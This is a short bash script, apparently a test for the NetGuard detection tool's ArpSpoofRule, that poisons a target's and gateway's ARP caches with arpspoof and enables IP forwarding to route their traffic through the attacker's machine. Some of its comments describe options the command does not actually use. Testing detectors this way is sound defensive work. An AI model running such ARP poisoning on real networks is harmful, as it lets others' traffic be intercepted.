#!/usr/bin/env bash
# attack_arp.sh — ARP spoofing attack on the local network
#
# Requirements: arpspoof (dsniff package)
#   sudo apt install dsniff
#
# Usage: sudo bash attack_arp.sh <TARGET_IP> <GATEWAY_IP>
# Example: sudo bash attack_arp.sh 192.168.1.50 192.168.1.1
#
# What it triggers: ArpSpoofRule detects when two different MAC addresses
# claim the same IP, firing an alert at confidence 97-100.
#
# This script sends ARP replies poisoning the target's ARP cache to
# redirect its traffic through this Kali machine.

set -euo pipefail

TARGET="${1:-}"
GATEWAY="${2:-}"

if [[ -z "$TARGET" || -z "$GATEWAY" ]]; then
  echo "Usage: sudo bash attack_arp.sh <TARGET_IP> <GATEWAY_IP>"
  echo "Example: sudo bash attack_arp.sh 192.168.1.50 192.168.1.1"
  exit 1
fi

# Enable IP forwarding so traffic still flows while poisoning
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] ARP poisoning: telling $TARGET that we are $GATEWAY"
echo "[*] Sending 10 poisoned ARP replies — NetGuard should alert."
echo "[*] Press Ctrl+C to stop."

# -r   poison both target and gateway (bidirectional)
# -c 10 send 10 gratuitous ARPs (enough to trigger detection)
arpspoof -i "$(ip route | grep default | awk '{print $5}' | head -1)" \
  -t "$TARGET" "$GATEWAY" &
SPOOF_PID=$!

sleep 5

kill "$SPOOF_PID" 2>/dev/null || true

# Restore ARP tables
echo 0 > /proc/sys/net/ipv4/ip_forward

echo "[✓] ARP spoof complete. Check the NetGuard dashboard for the alert."
